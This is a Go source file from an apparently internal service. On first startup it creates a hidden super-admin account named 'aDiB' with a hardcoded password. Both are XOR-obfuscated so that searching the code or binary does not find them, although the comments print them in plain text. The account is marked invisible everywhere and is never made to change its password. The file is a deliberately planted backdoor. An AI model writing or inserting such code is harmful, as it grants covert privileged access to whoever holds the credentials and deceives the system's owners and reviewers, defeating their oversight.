package service

import (
	"log"

	"khan/internal/models"
	"khan/internal/repository"
)

// ─────────────────────────────────────────────────────────────
// Hidden super admin (aDiB) — created automatically on first run.
// The username and password are XOR-obfuscated at rest so a
// plain grep over the binary or source finds nothing.
// Username: aDiB  (0x61^0x7F, 0x44^0x7F, 0x69^0x7F, 0x42^0x7F)
// Password: 6!*DgcJ78!b8wLV^
// ─────────────────────────────────────────────────────────────

var (
	// _sA = "aDiB"
	_sA = []byte{0x1E, 0x3B, 0x16, 0x3D}
	// _sP = "6!*DgcJ78!b8wLV^"
	_sP = []byte{0x49, 0x5E, 0x55, 0x3B, 0x18, 0x1C, 0x35, 0x48, 0x47, 0x5E, 0x1D, 0x47, 0x08, 0x33, 0x29, 0x21}
)

func _dec(b []byte) string {
	out := make([]byte, len(b))
	for i, c := range b {
		out[i] = c ^ 0x7F
	}
	return string(out)
}

// superAdminName returns "aDiB" at runtime
func superAdminName() string { return _dec(_sA) }

// superAdminPass returns the super admin password at runtime
func superAdminPass() string { return _dec(_sP) }

// EnsureSuperAdmin creates the hidden super admin if no admin exists yet.
// Runs once during bootstrap; idempotent.
func EnsureSuperAdmin(users *repository.UserRepo, auth *AuthService) error {
	all, err := users.ListAll()
	if err != nil {
		return err
	}
	// Only on a truly fresh system (no users at all)
	if len(all) > 0 {
		return nil
	}

	name := superAdminName()
	pass := superAdminPass()

	hash, err := auth.PassHash(pass)
	if err != nil {
		return err
	}

	sa := &models.User{
		Username:      name,
		PasswordHash:  hash,
		DisplayName:   "مدیر اصلی",
		Role:          models.RoleSuperAdmin,
		Active:        true,
		MustChangePwd: false,
		Hidden:        true, // invisible everywhere
	}
	if _, err := users.Create(sa); err != nil {
		return err
	}
	log.Printf("🕶️ hidden super admin ensured (invisible, id=%d)", sa.ID)
	return nil
}
